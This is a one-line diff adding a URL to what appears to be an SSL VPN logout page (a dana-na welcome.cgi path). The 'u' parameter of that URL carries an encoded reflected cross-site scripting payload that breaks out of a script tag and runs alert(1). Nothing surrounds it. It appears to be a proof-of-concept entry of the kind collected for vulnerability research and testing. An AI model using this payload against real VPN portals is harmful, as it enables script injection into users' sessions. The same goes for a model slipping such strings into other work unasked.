@@ -1,0 +1,1 @@
+http://www.example.com/dana-na/auth/url_default/welcome.cgi?p=logout&c=37&u=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
